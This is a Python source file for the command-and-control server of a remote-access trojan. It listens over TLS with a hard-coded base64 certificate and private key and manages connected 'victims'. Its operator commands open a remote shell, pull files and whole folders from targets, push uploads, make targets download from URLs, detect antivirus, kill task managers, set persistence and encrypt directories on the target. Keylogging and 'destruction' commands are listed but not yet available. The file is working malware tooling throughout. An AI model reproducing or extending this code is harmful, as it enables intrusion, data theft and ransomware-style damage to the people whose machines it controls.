#!/usr/bin/python
import base64
import os
import socket
import ssl
import tempfile
import threading
from colorama import Fore
import colorama
from base64 import b64decode
import sys
from osGuess import init_guess
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.formatted_text import ANSI
colorama.init()

Y = Fore.LIGHTYELLOW_EX
R = Fore.LIGHTRED_EX
B = Fore.LIGHTBLUE_EX
CY = Fore.LIGHTCYAN_EX
G = Fore.LIGHTGREEN_EX
END = Fore.RESET

# Variables globales
history = InMemoryHistory()
session = PromptSession(history=history)
stopAll = False
victims = {
    'ip': [],
    'target': [],
    'os': []
}


def crte():
    return b'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMyakNDQWNLZ0F3SUJBZ0lVY2wvZmZVbVc1NlE4cDlFU2VrdnlkVWhFOWJRd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF3d05LaTVsZUdGdGNHeGxMbU52YlRBZUZ3MHlNekE1TURZeU1EQXhOVFJhRncweQpOREE1TURVeU1EQXhOVFJhTUJneEZqQVVCZ05WQkFNTURTb3VaWGhoYlhCc1pTNWpiMjB3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUNvOStBTWw0aVpvTzdEZzd5QTB4cUcyaHRGTnZwUExxT3gKbkk1bkNCWVR6azFqV1ZvcjcycXZNOW9iR0lIeG1CWUJ1YXRIS0V0NXJWTzRLNXB2b1NrekdhT3NmUUtYbzcyYgp5TmRYemFKUVN3WFZSSldkcEs1cnpjZlhqdUp3U3BtcHlpN2J5YXlyNlpmNFhPNk1rSFJoNWEzWkNXN1JJSk9MCmJSRndyLzRtWDM2VnU5SVBPdUk0cWFxWmlSa004WmpnUnZ6QWhXaDNubm1hcEtnb3JQSnUwSDNhblBZTkxYU2oKMU5sWUg4MGFQMTQwZkFOaG9zbjRFbHdtRjY1V2xhNU1USlJlbXpxbG5OczA0OTBGOUVxL1hRbkVTS0hRditBKwpOY21abE1rL1pHd2xVWnovbUgxdGt3VkgrZXJnYXBMMk0vR2FPK09MWjdqU2NLU2E3SmVuQWdNQkFBR2pIREFhCk1CZ0dBMVVkRVFRUk1BK0NEU291WlhoaGJYQnNaUzVqYjIwd0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFFUHgKeEx3dFdndWcxYkNsaG5hRUFoRU1iL2hBNDBsbE5nSU5sOVptWk5LMUFBZUU0bjVaZ2tzSWZaV1dlUmVYT0p2VQp1TkhON3JFRnAwWktKNmNsSjVPOUk5eG5aU3gzbms4UVN5eFl2RE56Y0QyYTlEMklCcmYwZFROUnJUam8vdlozClBHVythL0lnaWI0dCs1SkljOTV3NEN1S210NFpoT3ZxZmo0bkZXYWpkbjdIZ0lvRnNjeGRVZW82aU00aHArcWcKOU94M0JJRVVTWFg4bDFCdFVodXYyaVZUTTJTdDRXMmk4N1BUVTlDcEMzQ3hYaHpmUHdhNkVNK25uSE9oRkNwQQpvcTI0cVEwS2svckczZVluRCtRTnhHRXdPekF0Q3YzUTZZNlVvMXV1TVNqUDgwaXJtVjREeFlPRFVpUkRaRjZiClNYZWRRcVREVTgyTi96WGpXdVE9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'


def locker():
    return b'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBcVBmZ0RKZUltYUR1dzRPOGdOTWFodG9iUlRiNlR5NmpzWnlPWndnV0U4NU5ZMWxhCksrOXFyelBhR3hpQjhaZ1dBYm1yUnloTGVhMVR1Q3VhYjZFcE14bWpySDBDbDZPOW04alhWODJpVUVzRjFVU1YKbmFTdWE4M0gxNDdpY0VxWnFjb3UyOG1zcSttWCtGenVqSkIwWWVXdDJRbHUwU0NUaTIwUmNLLytKbDkrbGJ2UwpEenJpT0ttcW1Za1pEUEdZNEViOHdJVm9kNTU1bXFTb0tLenlidEI5MnB6MkRTMTBvOVRaV0IvTkdqOWVOSHdECllhTEorQkpjSmhldVZwV3VURXlVWHBzNnBaemJOT1BkQmZSS3YxMEp4RWloMEwvZ1BqWEptWlRKUDJSc0pWR2MKLzVoOWJaTUZSL25xNEdxUzlqUHhtanZqaTJlNDBuQ2ttdXlYcHdJREFRQUJBb0lCQURNbTF5ejRzdUhQVm5qWgo2TGNYTVhDaGxwL2RoT2x6dFJxUHlveG1aa2lZcTlUbnQrU1ZGamJ6KzVNNFdCNUxiRjRaVjBDemNpWGowdlJ1ClB0S01kMnlBMW92aFRHZWJxa3IvQWpJU2pwREFKWVBxdjJCNStsT29lRmRKYWtPVVVmQ1V4SnJFOHdFWU5tbDUKdUwzVS9XYWxvWHVTMzNsdjR6clNTZlZUVWgxTFROalBXVDVHdnhST3dUMTYzdUpqL05sSGxrdEhwNEhzdDdVLwpoR3l6T0RQWFdBdnZBcG5jeHRTZ2dZdVUwdStTN3M3QndCRmVwbGhTSHJ4K2lleWsvR044amptQVJTL3dLa2U4ClcwYWhFN3hMcU01L3JDbFNFeTU0aExjbzhMbjVVcXVjUmRzUlNxVjBvZXNWbFF4dU03aWJneU9nVmtZd1pxWmUKK2pOK1JBRUNnWUVBNkFpODdKd2F1dTNsY3lnU2toelFRTHNqMlRUYXpNWGxPbVJnc3ROZkRrS0hUUFZ5S290UApSR0x4eUg2YzVmRGhwVUpTdGhTbkpRN1djMWZnazdMSTY0SklnNmc1ajNWRjBFRDZMSHNROGd2YktJZFNERnc2CjJDNDBqNThwZ0YwQ1Y1UWlqd2pWdm1wRU1oTDAzL2d5cm1RV3VJQTJQQURwREtFMFZJaWF4b01DZ1lFQXVtdVoKZ0lhSVBUMWdCQlhaUWdTOUJNWWN2bzNCNXJnUnNMd295ZEliM2VOcUVlS1pRL1htMmJ0c3NIeTdmV2JRSGhYZQp5Y0F6RklMdVppTzRyRUFaQ0F3cjQydmZOVTFoY0tHbzB6QVlyd2dwQ2pEaExvYTF6Smp3RE1UNmRkcG9oZzFHClhWcGlkMG1Dd1hTM2FrTUQzWGFxZmFlYVlObXZwSGRiUmV4dUFRMENnWUVBeEdxcEtvM1dYc2lGQTk4M0lUSjgKNDE3SE1OWDZKWCtiMUxzbDFCcnppMG1yNk95WThRU3VYQkI1NWFPd1EwR09jV3RjUXIvbTRZclc1QnJPZzVqRApWZ0VhUzBDN1FRSWZ6L05CRXlnMkp2NzhUU21IdmVqUTh6RGgwM1lERnFNbEdXZlBmVThZU0xFQiszVnFqckUyCmpjTXlMSXB6M29WU3doc3dCaU1CQ2VzQ2dZQVJ5NU9yb1N3QUxJdXQyQ2dWRlQ2MTVmTjRmUysxUm56cDBneFMKdDZ2UlVwUWRnUFFBZU1qQW9CT1FCVmdnY0dBTmZ5ajFPVk9tOFppd1IxaXBtTFRLLzk1d3B5dDNleHVDRk94NAp2RzZleHJpa01HWk9lcTJBQ2xsZjNxM0o4ajlvREh4YkRQVzVUVnNkL0haRnZuL3Y5QlB5U3IyQjRVWFMvVkhKCkt2aVZRUUtCZ0Z5NUppNjJja1JzRklqNlkxaEhGOElJYVQvYzJ4Um9tL3hzcEtGR3VpUlhOM0Z0eHpEaUhnRGQKMWFsUXZZK1E2TEZIbEVGNlNaK21vaGI1b24xQUZxL2VrRDJtKzduNW5vRkNodENyRUJqK0Y5MnNRcjdqMmVTbQpEWS93dE1BeGhBVlFTd0piM3BlMHM2aFRSSGJZU05qSmlHY2t5WHQ3bkQ2VE9zcncvU1p5Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=='


def get_crte():
    return b64decode(crte()).decode()


def get_locker():
    return b64decode(locker()).decode()


crt = tempfile.NamedTemporaryFile(delete=False)
crt.write(get_crte().encode())
crt.close()

ky = tempfile.NamedTemporaryFile(delete=False)
ky.write(get_locker().encode())
ky.close()

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.load_cert_chain(certfile=crt.name, keyfile=ky.name)


def clean():
    os.system("clear")


def help_option():
    print('''

                Aviable Commands:

                    | [!>] download <path> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask       -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check           -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo         -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell           -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av              -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>   -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence     -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence  -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>  -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>  ->  Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction     -> (N/A) Eliminate all and close conect
                    ---------------------------------------------------------
                    | [!>] screenshot      -> (N/A) Take a screenshot
                    ---------------------------------------------------------
                    | [!>] keylog_dump     -> (N/A) Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] crypt <file>    -> (N/A) Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] q               -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit            -> Terminate the conection
                    ---------------------------------------------------------
    ''')


def start(serverSock, promt):
    while True:
        if stopAll:
            break
        serverSock.settimeout(1)
        try:
            conn, ip = serverSock.accept()

            victims['ip'].append(ip)
            victims['target'].append(conn)
            victims['os'].append(init_guess(ip[0]))
            print(f"\n{Y}[>]{R} New Connection From: {END}{ip}")
            print(f"\n\t{promt}", end="")
        except Exception as e:
            pass


def printVictims(promt):
    if victims['ip']:
        session = 0
        print(f"\n\t\t{R}[  {Y}SESSIONS  {R}]{END}")
        for ip in victims["ip"]:
            os = victims['os'][session]
            print(f"\n{Y}Session:{END} {session}\n\t{R}║")
            print(f"\t║═══► {Y}IP Address:{END} {ip[0]}")
            print(f"\t{R}║═══► {Y}Os Guess:{END} {os}")
            print(f'\t{R}╚═══► {Y}Source Port:{END} {ip[1]}')

            session += 1
        print(f"\n\t     {R}[  {Y}END SESSIONS  {R}]{END}\n")
    else:
        print(f"\n\t\t{R}[  {Y}NO SESSIONS AVIABLE  {R}]{END}")


def setSession(cmd):
    ses = cmd[8:]
    try:
        ses = int(ses)
        ip = victims['ip'][ses]
        targetConn = victims['target'][ses]
        print(f"\n{Y}[>]{B} Setted session {ses}\n")
        mainFunctions(ip, targetConn, ses)
    except ValueError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")
    except IndexError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")


def startTaskCommand(targetConn):
    targetConn.send("c3RhcnRUYXNrCg==".encode())
    confirm = targetConn.recv(1024)
    if "successfully".encode() in confirm:
        print(f"\n\t{Y}[*>] {B}Command Send Successfully{END}\n")
        settask = True
    else:
        print(f"\n\t{Y}[*>] {R}Command Send Unsuccessfully...{END}\n")
        settask = False

    return settask


def check(cachedCommands, targetConn, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} {cachedCommands['commands'][command]}")

    else:
        targetConn.send("Y2hlY2sK".encode())
        admin = targetConn.recv(1024).decode()
        cachedCommands['commands'][command] = admin
        print(admin)
        return admin


def preSetTask(targetConn, cachedCommands, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} Task already started...\n")
        return
    else:
        cachedCommands['commands'][command] = startTaskCommand(targetConn)
    return cachedCommands['commands'][command]


def recvSys(cachedCommands, targetConn, command):
    if command in cachedCommands['commands']:
        print(f"\n{Y}Cached Response:{END} System Info:{cachedCommands['commands'][command]}\n")
    else:
        targetConn.send("c3lzaW5mbwo=".encode())
        sysinfo = targetConn.recv(2048).decode()
        cachedCommands['commands'][command] = sysinfo
        print(sysinfo)
        return sysinfo


def shell(targetConn, ip):
    targetConn.send("c2hlbGwK".encode())
    prompt = f"{Y}<*{R} Shell {Y}* {ip[0]}>: {END} "

    while True:
        command = session.prompt(ANSI(prompt))

        if command.strip() == "":
            continue

        elif command == "q" or command == "exit":
            targetConn.send("q".encode())
            break

        elif "cd" in command:
            targetConn.send(command.encode())
            print(targetConn.recv(1024).decode())

        else:
            print(command)
            sendAndRecvCmd(targetConn, command)


def sendAndRecvCmd(targetConn, command):
    execCoded = f"ZXhlYwo= {command.replace('exec ', '')}"
    targetConn.send(execCoded.encode())
    response = targetConn.recv(4096)

    if response:
        if "buffer".encode() in response:
            buffer = int(response.decode('utf-8', errors='ignore').replace("buffer ", ""))
            response = targetConn.recv(buffer).decode('utf-8', errors='ignore')
            print(response)

        else:
            response = response.decode('utf-8', errors='ignore')
            if "not found\n" in response:
                print(f"\n {Y}[!] {R}Command Not Found...{END}\n")
            else:
                print(response)


def closeConn(targetConn, ses):
    targetConn.send("Y2xvc2UK".encode())
    targetConn.close()
    ip = victims['ip'][ses]
    conn = victims['target'][ses]
    victims['ip'].remove(ip)
    victims['target'].remove(conn)


def getFile(ip, targetConn, command):
    buffer = 4096
    if not os.path.exists(f'./DATA/{ip[0]}/'):
        os.makedirs(f'./DATA/{ip[0]}')
    codedDownload = "ZG93bmxvYWQK " + command[8:]
    targetConn.send(codedDownload.encode())
    fileData = b""
    with open(f"./DATA/{ip[0]}/{command[8:]}", "wb") as file:
        while True:
            data = targetConn.recv(buffer)
            if "end".encode() in data:
                break

            if len(data) % 4 != 0:
                data += b'=' * (4 - len(data) % 4)
            data = base64.b64decode(data)
            fileData += data

        file.write(fileData)
    print(f"\n\t{Y}[*>]{R} File Downloaded Successfully [./DATA/{ip[0]}]{END}\n")


def getAllFiles(targetConn, command, ip):
    if not os.path.exists(f'./DATA/{ip[0]}/'):
        os.makedirs(f'./DATA/{ip[0]}')

    file_path = command.replace("downloadDir ", "")
    os.makedirs(f"./DATA/{ip[0]}/{file_path}")
    codedDownload = "ZG93bmxvYWREaXIK " + file_path
    targetConn.send(codedDownload.encode())

    total_size = int(targetConn.recv(1024).decode())
    received = 0
    progress_bar_length = 30
    progress = 0

    sys.stdout.write(f"\n{Y}*> {B}Recibiendo datos: {END}[")

    while True:
        # Recibe la ruta del archivo desde el cliente
        relative_path = targetConn.recv(1024).decode()
        if relative_path == 'DONE':
            # El cliente ha terminado de enviar archivos
            break

        # Crea los directorios necesarios para mantener la estructura original
        os.makedirs(os.path.dirname(f"./DATA/{ip[0]}/{file_path}/{relative_path}"), exist_ok=True)

        # Recibe el archivo y lo guarda en la ubicación correcta
        with open(f"./DATA/{ip[0]}/{file_path}/{relative_path}", 'wb') as f:
            data = targetConn.recv(1024)
            while data:
                if data == "end".encode():
                    break
                f.write(data)
                received += len(data)
                new_progress = int(progress_bar_length * received / total_size)
                if new_progress > progress:
                    sys.stdout.write("▓" * (new_progress - progress))
                    sys.stdout.flush()
                    progress = new_progress
                data = targetConn.recv(1024)

    if progress < progress_bar_length:
        sys.stdout.write("▓" * (progress_bar_length - progress))
    sys.stdout.write("]\n\n")


def detectAV(taretConn, command, cachedCommands):
    if command in cachedCommands['commands']:
        print("\nCached Command: \n\n")
        for av in cachedCommands['commands'][command]:
            print(av)
            #print(f"\t{B}[!>] {Y}Detected Anti-Virus: \n\n\t\t{R}{av}\n{END}")

    else:
        taretConn.send("YXYK".encode())
        print(f"\n{B}[!>] {Y}Info: {END}Detecting Anti-Virus on target...\n")
        print(f"\t{R}[*>] {Y} This may take a while...{END}\n")
        antiViurs = []
        while True:
            res = taretConn.recv(1024)

            if res != "n".encode() and res != "end".encode():
                print(f"\n{B}[!>] {Y}Anti-Virus Detected: {R}{res.decode()}{END}")
                antiViurs.append(f"\n\t{B}[!>] {Y}Anti-Virus Detected: {R}{res.decode()}{END}")

            elif res == "n".encode():
                print(f"\n{B}[*>]{Y} No Anti-Virus Detected!\n")
                antiViurs.append(f"{B}[*>]{Y} No Anti-Virus Detected!")
                break

            elif res == "end".encode():
                break

        cachedCommands['commands'][command] = antiViurs


def upload(command, targetConn):
    codedUpload = f"dXBsb2FkCg== {command.replace('upload ', '')}"
    targetConn.send(codedUpload.encode())
    file = command.replace("upload ", "")

    with open(file, "rb") as fl:
        while True:
            dt = fl.read(4096)
            dt = base64.b64encode(dt)
            if not dt:
                targetConn.send('end'.encode())
                break
            targetConn.send(dt)
        fl.close()

    print(f"\n\t{Y}[*>]{R} File Uploaded Successfully\n")


def getFileURL(command, targetConn):
    url = command.replace("get ", "")
    getCoded = f"Z2V0Cg== {url}"
    targetConn.send(getCoded.encode())
    resp = targetConn.recv(1024)
    if resp == "end".encode():
        print(f"\n\t{Y}[*>] {B}File Downloaded Successfully\n {END}")
    else:
        print("ERROR: " + resp.decode(errors="ignore", encoding="utf-8"))


def tryPersistence(targetConn):
    persistenceCoded = "cGVyc2lzdGVuY2UK"
    targetConn.send(persistenceCoded.encode())
    res = targetConn.recv(1024)
    if res == "no_root".encode():
        print(f"\n\t{Y}[!>]{R} No Suficient Privileges...\n")
    elif res == "root":
        print(f"\n\t{Y}[!>]{B} Persistence successfully added...\n")
    else:
        print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")


def lowPersistence(targetConn):
    persistenceCoded = "bG93cGVyc2lzdGVuY2UK"
    targetConn.send(persistenceCoded.encode())
    res = targetConn.recv(1024)
    if res == "done".encode():
        print(f"\n\t{Y}[!>]{B} Low Persistence successfully added...\n")
    else:
        print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")


def cryptDir(targetConn, command):
    codedCrypt = "Y3J5cHREaXIK " + command.replace("cryptDir ", "")
    targetConn.send(codedCrypt.encode())
    res = targetConn.recv(1024)
    if res == "done".encode():
        print(f"\n\t{Y}[*>] {B}Dir Crypted Successfully{END}\n")
    else:
        print(f"\n\t{Y}[*>] {R}Dir Crypted Unsuccessfully{END}\n")


def mainFunctions(ip, targetConn, ses):
    try:
        cachedCommands = {'commands': {}}
        prompt = f"{Y}<*{R} C&C {Y}* {ip[0]}>: {END} "

        while True:
            command = session.prompt(ANSI(prompt))
            if command == "exit":
                closeConn(targetConn, ses)
                break

            elif command.startswith("q"):
                break

            elif command.startswith("help"):
                help_option()

            elif command.startswith("startTask"):
                preSetTask(targetConn, cachedCommands, command)

            elif command.startswith("check"):
                check(cachedCommands, targetConn, command)

            elif command.startswith('sysinfo'):
                recvSys(cachedCommands, targetConn, command)

            elif command[:11] == 'downloadDir':
                getAllFiles(targetConn, command, ip)

            elif command[:8] == 'download':
                getFile(ip, targetConn, command)

            elif command.startswith('upload'):
                upload(command, targetConn)

            elif command.startswith('exec'):
                sendAndRecvCmd(targetConn, command)

            elif command.startswith("av"):
                detectAV(targetConn, command, cachedCommands)

            elif command.startswith("get"):
                getFileURL(command, targetConn)

            elif command.startswith("persistence"):
                tryPersistence(targetConn)

            elif command.startswith("lowpersistence"):
                lowPersistence(targetConn)

            elif command.startswith("cryptDir"):
                cryptDir(targetConn, command)

            elif command.startswith('shell'):
                shell(targetConn, ip)

    except BrokenPipeError as e:
        print(f"\n{R}[>!] ERROR:{Y} {e}\n")
        closeConn(targetConn, ses)


def server(serverSock):
    prompt = f"{Y}<*{R} C&C {Y}*>: {END}"
    connThread = threading.Thread(target=start, args=(serverSock,prompt))
    connThread.start()

    while True:
        cmd = session.prompt(ANSI(prompt))

        if "victims" in cmd or 'targets' in cmd:
            printVictims(prompt)

        elif "session" in cmd or "target" in cmd:
            setSession(cmd)

        else:
            continue


if __name__ == "__main__":
    print(f"{Y}[!>] {R}Waiting For incoming Conections...{END}")
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serverSock.bind(('0.0.0.0', 1337))
    serverSock.listen(5)
    serverSock = context.wrap_socket(serverSock)
    server(serverSock)
